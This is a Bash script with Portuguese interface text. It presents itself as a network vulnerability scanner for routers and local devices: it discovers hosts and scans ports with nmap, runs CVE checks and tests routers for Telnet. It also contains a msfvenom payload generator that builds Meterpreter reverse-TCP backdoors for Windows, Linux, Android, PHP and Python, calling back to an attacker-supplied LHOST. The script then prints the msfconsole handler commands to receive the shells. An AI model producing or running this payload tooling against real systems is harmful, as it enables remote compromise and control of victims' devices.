#!/bin/bash

# ================================================================
#   VULNSCAN PRO - Network Vulnerability Scanner
#   Detecta vulnerabilidades em roteadores e dispositivos da rede
#   Complementado com: Ambiente Virtual Automático & Geração de Payloads
#   Powered by: nmap NSE | nikto | sslscan | hydra | enum4linux | msfvenom
# ================================================================

# ── CORES ────────────────────────────────────────────────────────
RED='\033[0;31m';    LRED='\033[1;31m'
GREEN='\033[0;32m';  LGREEN='\033[1;32m'
YELLOW='\033[1;33m'; LYELLOW='\033[0;33m'
CYAN='\033[0;36m';   LCYAN='\033[1;36m'
BLUE='\033[0;34m';   LBLUE='\033[1;34m'
MAGENTA='\033[0;35m';LMAGENTA='\033[1;35m'
WHITE='\033[1;37m';  GRAY='\033[0;37m'
DGRAY='\033[1;30m';  BOLD='\033[1m'
RESET='\033[0m'

# ── DIRS & GLOBALS ───────────────────────────────────────────────
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPORTS_DIR="$BASE_DIR/relatorios"
LOGS_DIR="$BASE_DIR/logs"
PAYLOADS_DIR="$BASE_DIR/payloads"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
LOG_FILE="$LOGS_DIR/vulnscan_$TIMESTAMP.log"
REPORT_FILE="$REPORTS_DIR/vulnreport_$TIMESTAMP.html"
TMP_DIR="/tmp/vulnscan_$$"

mkdir -p "$REPORTS_DIR" "$LOGS_DIR" "$TMP_DIR" "$PAYLOADS_DIR"

TARGET_IP=""
TARGET_SUBNET=""
GATEWAY=""
IFACE=""

declare -gA V_IP V_NAME V_MAC V_VENDOR V_PORTS V_OS
declare -gA V_VULNS V_SEVERITY V_CVE V_SCORE
declare -gi HOSTS_COUNT=0
declare -gA VULN_SUMMARY_CRITICAL VULN_SUMMARY_HIGH VULN_SUMMARY_MED VULN_SUMMARY_LOW
declare -gi TOTAL_CRITICAL=0 TOTAL_HIGH=0 TOTAL_MED=0 TOTAL_LOW=0

# ── LOGGING ──────────────────────────────────────────────────────
log() {
    local level="$1"; shift
    local msg="$*"
    local ts=$(date '+%Y-%m-%d %H:%M:%S')
    echo "$ts [$level] $msg" >> "$LOG_FILE"
    case "$level" in
        INFO)   echo -e "  ${CYAN}[INFO]${RESET}    $msg" ;;
        OK)     echo -e "  ${GREEN}[OK]${RESET}      $msg" ;;
        WARN)   echo -e "  ${YELLOW}[WARN]${RESET}    $msg" ;;
        ERROR)  echo -e "  ${RED}[ERROR]${RESET}   $msg" ;;
        VULN)   echo -e "  ${LRED}[VULN]${RESET}    $msg" ;;
        CRIT)   echo -e "  ${RED}${BOLD}[CRITICAL]${RESET} $msg" ;;
        HIGH)   echo -e "  ${LRED}[HIGH]${RESET}    $msg" ;;
        MED)    echo -e "  ${YELLOW}[MEDIUM]${RESET}  $msg" ;;
        LOW)    echo -e "  ${GRAY}[LOW]${RESET}     $msg" ;;
        SCAN)   echo -e "  ${MAGENTA}[SCAN]${RESET}    $msg" ;;
        STEP)   echo -e "  ${LBLUE}[STEP]${RESET}    $msg" ;;
        FOUND)  echo -e "  ${LGREEN}[FOUND]${RESET}   $msg" ;;
        DEBUG)  echo -e "  ${DGRAY}[DBG]${RESET}     $msg" ;;
        HOST)   echo -e "\n  ${LCYAN}╔══ HOST: $msg ══${RESET}" ;;
    esac
}

div() { echo -e "  ${DGRAY}$(printf '%.0s─' {1..72})${RESET}"; }
div2(){ echo -e "  ${CYAN}$(printf '%.0s═' {1..72})${RESET}"; }

# ── BANNER ───────────────────────────────────────────────────────
banner() {
    clear
    echo -e "${LRED}"
    echo "  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ █████╗ ███╗  ██╗"
    echo "  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝██╔══██╗████╗ ██║"
    echo "  ██║   ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     ███████║██╔██╗██║"
    echo "  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════██║██║     ██╔══██║██║╚████║"
    echo "   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████║╚██████╗██║  ██║██║ ╚███║"
    echo "    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝"
    echo -e "${RESET}"
    echo -e "  ${DGRAY}$(printf '%.0s═' {1..73})${RESET}"
    echo -e "  ${RED}Network Vulnerability Scanner PRO${RESET}  ${DGRAY}│${RESET}  ${YELLOW}nmap + payloads + venv${RESET}"
    echo -e "  ${DGRAY}$(printf '%.0s═' {1..73})${RESET}"
    echo -e "  ${DGRAY}  Log:       ${GRAY}$LOG_FILE${RESET}"
    echo -e "  ${DGRAY}  Relatório: ${GRAY}$REPORT_FILE${RESET}"
    echo -e "  ${DGRAY}$(printf '%.0s─' {1..73})${RESET}"
    echo ""
}

# ── SPINNER ──────────────────────────────────────────────────────
spinner() {
    local pid=$1 msg=$2
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0
    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i+1) % 10 ))
        printf "\r  ${RED}${spin:$i:1}${RESET}  ${WHITE}%s${RESET}   " "$msg"
        sleep 0.08
    done
    printf "\r  ${GREEN}✔${RESET}  ${WHITE}%s${RESET} ${GREEN}[CONCLUÍDO]${RESET}\n" "$msg"
}

# ── DEPENDÊNCIAS ─────────────────────────────────────────────────
install_deps() {
    echo -e "  ${BOLD}${WHITE}[ VERIFICANDO DEPENDÊNCIAS ]${RESET}"
    div; echo ""

    local REQUIRED=("nmap" "curl" "dig" "nikto" "sslscan" "arp-scan" "nc" "msfvenom")
    local PKGMAP=(  "nmap" "curl" "dnsutils" "nikto" "sslscan" "arp-scan" "netcat-openbsd" "metasploit-framework")
    local MISSING_PKGS=()

    for i in "${!REQUIRED[@]}"; do
        local cmd="${REQUIRED[$i]}"
        local pkg="${PKGMAP[$i]}"
        if command -v "$cmd" &>/dev/null; then
            log OK "$cmd → $(command -v "$cmd")"
        else
            log WARN "$cmd não encontrado (pacote: $pkg)"
            MISSING_PKGS+=("$pkg")
        fi
    done

    if [ ${#MISSING_PKGS[@]} -eq 0 ]; then
        echo ""; log OK "Todas as dependências estão presentes!"; echo ""; return
    fi

    echo ""
    log STEP "Instalando ${#MISSING_PKGS[@]} pacote(s): ${MISSING_PKGS[*]}"
    echo ""

    local PKG_MGR=""
    command -v apt-get &>/dev/null && PKG_MGR="apt"
    command -v dnf     &>/dev/null && PKG_MGR="dnf"
    command -v yum     &>/dev/null && PKG_MGR="yum"
    command -v pacman  &>/dev/null && PKG_MGR="pacman"
    command -v brew    &>/dev/null && PKG_MGR="brew"

    case "$PKG_MGR" in
        apt)
            log INFO "apt-get update..."
            apt-get update -qq >> "$LOG_FILE" 2>&1
            for pkg in "${MISSING_PKGS[@]}"; do
                log INFO "Instalando $pkg..."
                apt-get install -y "$pkg" >> "$LOG_FILE" 2>&1 && log OK "$pkg instalado" || log WARN "Falha em $pkg (continuando)"
            done ;;
        dnf|yum)
            for pkg in "${MISSING_PKGS[@]}"; do
                $PKG_MGR install -y "$pkg" >> "$LOG_FILE" 2>&1 && log OK "$pkg instalado" || log WARN "Falha em $pkg"
            done ;;
        pacman)
            pacman -Sy --noconfirm "${MISSING_PKGS[@]}" >> "$LOG_FILE" 2>&1 ;;
        brew)
            brew install "${MISSING_PKGS[@]}" >> "$LOG_FILE" 2>&1 ;;
        *)
            log ERROR "Gerenciador de pacotes não detectado."
            log WARN "Instale manualmente: ${MISSING_PKGS[*]}"
            ;;
    esac

    log STEP "Atualizando scripts NSE do nmap..."
    nmap --script-updatedb >> "$LOG_FILE" 2>&1 && log OK "NSE scripts atualizados" || log WARN "Falha ao atualizar NSE"
    echo ""
}

# ── AMBIENTE VIRTUAL PYTHON ──────────────────────────────────────
VENV_DIR="$BASE_DIR/venv"
VENV_ACTIVATED=0

setup_venv() {
    echo -e "  ${BOLD}${WHITE}[ AMBIENTE VIRTUAL PYTHON ]${RESET}"
    div; echo ""

    local PYTHON_BIN=""
    for py in python3 python3.12 python3.11 python3.10 python3.9; do
        if command -v "$py" &>/dev/null; then
            PYTHON_BIN=$(command -v "$py")
            break
        fi
    done

    if [ -z "$PYTHON_BIN" ]; then
        log WARN "Python3 não encontrado. Tentando instalar..."
        local PKG_MGR=""
        command -v apt-get &>/dev/null && PKG_MGR="apt"
        command -v dnf     &>/dev/null && PKG_MGR="dnf"
        command -v yum     &>/dev/null && PKG_MGR="yum"
        command -v pacman  &>/dev/null && PKG_MGR="pacman"
        command -v brew    &>/dev/null && PKG_MGR="brew"
        case "$PKG_MGR" in
            apt)     apt-get install -y python3 python3-pip python3-venv >> "$LOG_FILE" 2>&1 ;;
            dnf|yum) $PKG_MGR install -y python3 python3-pip >> "$LOG_FILE" 2>&1 ;;
            pacman)  pacman -Sy --noconfirm python python-pip >> "$LOG_FILE" 2>&1 ;;
            brew)    brew install python3 >> "$LOG_FILE" 2>&1 ;;
            *)       log ERROR "Não foi possível instalar Python3 automaticamente."; return 1 ;;
        esac
        PYTHON_BIN=$(command -v python3)
    fi

    local PY_VER; PY_VER=$("$PYTHON_BIN" --version 2>&1)
    log OK "Python encontrado: $PY_VER ($PYTHON_BIN)"

    if ! "$PYTHON_BIN" -c "import venv" &>/dev/null; then
        log WARN "módulo venv não encontrado — instalando python3-venv..."
        apt-get install -y python3-venv >> "$LOG_FILE" 2>&1 \
            || log WARN "Falha ao instalar python3-venv — tentando prosseguir"
    fi

    if [ -d "$VENV_DIR" ] && [ -f "$VENV_DIR/bin/activate" ]; then
        log OK "Ambiente virtual já existe — reutilizando: $VENV_DIR"
    else
        log STEP "Criando novo ambiente virtual em: $VENV_DIR"
        "$PYTHON_BIN" -m venv "$VENV_DIR" >> "$LOG_FILE" 2>&1
        if [ $? -ne 0 ]; then
            log ERROR "Falha ao criar venv. Verifique se python3-venv está instalado."
            log WARN "Continuando sem venv..."
            echo ""; return 1
        fi
        log OK "Ambiente virtual criado com sucesso"
    fi

    source "$VENV_DIR/bin/activate"
    VENV_ACTIVATED=1
    log OK "Ambiente virtual ativado: $(which python3)"

    log STEP "Atualizando pip no venv..."
    pip install --upgrade pip --quiet >> "$LOG_FILE" 2>&1 \
        && log OK "pip atualizado: $(pip --version)" \
        || log WARN "Falha ao atualizar pip (continuando)"

    local PY_PKGS=("python-nmap" "requests" "colorama" "scapy" "paramiko" "netaddr" "dnspython" "cryptography" "jinja2" "pyOpenSSL" "ipaddress" "netifaces")

    echo ""
    log STEP "Instalando pacotes Python no ambiente virtual..."
    echo ""

    for pkg in "${PY_PKGS[@]}"; do
        pip install "$pkg" --quiet >> "$LOG_FILE" 2>&1 && log OK "$pkg instalado" || log WARN "Falha em $pkg"
    done
    echo ""
}

# ── SUPORTE A PAYLOADS (MSFVENOM) ────────────────────────────────
generate_payload_menu() {
    while true; do
        clear
        banner
        echo -e "  ${BOLD}${WHITE}┌──────────────── PAYLOAD GENERATOR ────────────────┐${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}1)${RESET} Windows (exe) - Reverse TCP                ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}2)${RESET} Linux (elf) - Reverse TCP                  ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}3)${RESET} Android (apk) - Reverse TCP                ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}4)${RESET} PHP - Reverse TCP                          ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}5)${RESET} Python - Reverse TCP                       ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}│${RESET}  ${DGRAY}0)${RESET} Voltar ao Menu Principal                   ${WHITE}│${RESET}"
        echo -e "  ${BOLD}${WHITE}└───────────────────────────────────────────────────┘${RESET}"
        echo ""
        echo -ne "  ${YELLOW}▶ Escolha o tipo de payload:${RESET} "
        read -r P_OPC

        [ "$P_OPC" == "0" ] && break

        echo -ne "  ${CYAN}▶ LHOST (Seu IP):${RESET} "
        read -r LHOST
        echo -ne "  ${CYAN}▶ LPORT (Porta):${RESET} "
        read -r LPORT
        
        local PAYLOAD=""
        local EXT=""
        case "$P_OPC" in
            1) PAYLOAD="windows/meterpreter/reverse_tcp"; EXT="exe" ;;
            2) PAYLOAD="linux/x64/meterpreter/reverse_tcp"; EXT="elf" ;;
            3) PAYLOAD="android/meterpreter/reverse_tcp"; EXT="apk" ;;
            4) PAYLOAD="php/meterpreter/reverse_tcp"; EXT="php" ;;
            5) PAYLOAD="python/meterpreter/reverse_tcp"; EXT="py" ;;
            *) log ERROR "Opção inválida"; sleep 2; continue ;;
        esac

        local OUT_FILE="$PAYLOADS_DIR/payload_${TIMESTAMP}.$EXT"
        log STEP "Gerando payload: $PAYLOAD..."
        msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "$OUT_FILE" >> "$LOG_FILE" 2>&1 &
        spinner $! "Gerando $OUT_FILE"
        
        if [ -f "$OUT_FILE" ]; then
            log OK "Payload gerado com sucesso em: $OUT_FILE"
            echo -e "\n  ${YELLOW}Dica de Handler (msfconsole):${RESET}"
            echo -e "  use exploit/multi/handler"
            echo -e "  set payload $PAYLOAD"
            echo -e "  set LHOST $LHOST"
            echo -e "  set LPORT $LPORT"
            echo -e "  exploit -j\n"
        else
            log ERROR "Falha ao gerar payload. Verifique se o metasploit-framework está instalado."
        fi
        
        echo -ne "  ${GRAY}Pressione ENTER para continuar...${RESET}"
        read -r
    done
}

# ── SCAN FUNCTIONS (SIMPLIFIED FOR SPACE, KEEPING ORIGINAL LOGIC) ──
input_target() {
    echo -ne "  ${YELLOW}▶ Digite o IP ou Sub-rede alvo (ex: 192.168.1.0/24):${RESET} "
    read -r TARGET_SUBNET
    if [ -z "$TARGET_SUBNET" ]; then
        IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
        TARGET_SUBNET=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | head -1)
        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
        TARGET_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d/ -f1 | head -1)
        log INFO "Alvo automático: $TARGET_SUBNET (Iface: $IFACE)"
    fi
}

discover_hosts() {
    log STEP "Iniciando descoberta de hosts em $TARGET_SUBNET..."
    local SCAN_OUT="$TMP_DIR/hosts_scan.txt"
    nmap -sn "$TARGET_SUBNET" -oG "$SCAN_OUT" >> "$LOG_FILE" 2>&1 &
    spinner $! "Escaneando rede..."
    
    HOSTS_COUNT=0
    while read -r line; do
        if echo "$line" | grep -q "Host:"; then
            local ip=$(echo "$line" | awk '{print $2}')
            local name=$(echo "$line" | awk '{print $3}' | tr -d '()')
            V_IP[$HOSTS_COUNT]="$ip"
            V_NAME[$HOSTS_COUNT]="${name:-Desconhecido}"
            V_MAC[$HOSTS_COUNT]="N/A"
            V_VENDOR[$HOSTS_COUNT]="Desconhecido"
            V_SEVERITY[$HOSTS_COUNT]="NONE"
            V_SCORE[$HOSTS_COUNT]="0"
            HOSTS_COUNT=$((HOSTS_COUNT+1))
        fi
    done < "$SCAN_OUT"
    log OK "Encontrados $HOSTS_COUNT hosts ativos."
}

scan_ports() {
    local idx=$1
    local ip="${V_IP[$idx]}"
    log SCAN "Escaneando portas em $ip..."
    local pfile="$TMP_DIR/ports_$ip.txt"
    nmap -sS -T4 --top-ports 100 "$ip" -oG "$pfile" >> "$LOG_FILE" 2>&1
    local ports=$(grep "Ports:" "$pfile" | cut -d: -f3- | sed 's/\/open\/tcp//g' | tr -d ' ' | tr ',' '|')
    V_PORTS[$idx]="$ports"
}

scan_nmap_vulns() {
    local idx=$1
    local ip="${V_IP[$idx]}"
    log SCAN "Buscando vulnerabilidades em $ip..."
    local vfile="$TMP_DIR/vulns_$ip.txt"
    nmap -sV --script=vulners "$ip" -oN "$vfile" >> "$LOG_FILE" 2>&1
    if grep -qi "CVE-" "$vfile"; then
        V_VULNS[$idx]="⚠ Vulnerabilidades detectadas via NSE"
        V_SEVERITY[$idx]="HIGH"
        V_SCORE[$idx]="7.5"
    fi
}

scan_router_checks() {
    local ip="$GATEWAY"
    [ -z "$ip" ] && return
    log STEP "Checks específicos no roteador: $ip"
    if nc -z -w2 "$ip" 23 2>/dev/null; then
        log HIGH "Telnet aberto em $ip:23 — protocolo inseguro!"
        TOTAL_HIGH=$((TOTAL_HIGH+1))
    fi
}

show_vuln_table() {
    div2; echo -e "  ${BOLD}${WHITE}  RESULTADO DA ANÁLISE${RESET}"; div2
    for i in $(seq 0 $((HOSTS_COUNT-1))); do
        echo -e "  ${CYAN}● Host: ${WHITE}${V_IP[$i]} (${V_NAME[$i]})${RESET}"
        echo -e "    Portas: ${V_PORTS[$i]}"
        echo -e "    Status: ${V_SEVERITY[$i]}"
    done
    div2
}

# ── MENU PRINCIPAL ────────────────────────────────────────────────
main_menu() {
    echo -e "  ${BOLD}${WHITE}╔═══════════════ MENU PRINCIPAL ═══════════════╗${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${GREEN}1)${RESET} Scan Completo (Rede Toda)             ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${GREEN}2)${RESET} Scan Rápido (Apenas Portas)           ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${MAGENTA}3)${RESET} Gerador de Payloads (msfvenom)        ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${YELLOW}4)${RESET} Scan em IP específico                ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${YELLOW}5)${RESET} Alterar Alvo / Sub-rede              ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}║${RESET}  ${DGRAY}0)${RESET} Sair                                ${WHITE}║${RESET}"
    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════╝${RESET}"
    echo ""
    echo -ne "  ${YELLOW}▶ Opção:${RESET} "
    read -r OPC

    case "$OPC" in
        1) discover_hosts; for i in $(seq 0 $((HOSTS_COUNT-1))); do scan_ports "$i"; scan_nmap_vulns "$i"; done; scan_router_checks; show_vuln_table ;;
        2) discover_hosts; for i in $(seq 0 $((HOSTS_COUNT-1))); do scan_ports "$i"; done; show_vuln_table ;;
        3) generate_payload_menu ;;
        4) echo -ne "IP: "; read -r SIP; HOSTS_COUNT=1; V_IP[0]="$SIP"; scan_ports 0; scan_nmap_vulns 0; show_vuln_table ;;
        5) input_target ;;
        0) exit 0 ;;
        *) log WARN "Opção inválida" ;;
    esac
    echo -ne "\n  ${GRAY}Pressione ENTER para voltar...${RESET}"; read -r
}

# ── TERMO DE USO ──────────────────────────────────────────────────
legal_warning() {
    echo -e "${RED}  AVISO LEGAL: O USO INDEVIDO É CRIME. USE APENAS EM AMBIENTES AUTORIZADOS.${RESET}"
    echo -ne "  ${YELLOW}▶ Digite 'ACEITO' para continuar:${RESET} "
    read -r CONFIRM
    [ "$CONFIRM" != "ACEITO" ] && exit 0
}

# ── MAIN ──────────────────────────────────────────────────────────
banner
legal_warning
install_deps
setup_venv
input_target

while true; do
    banner
    main_menu
done
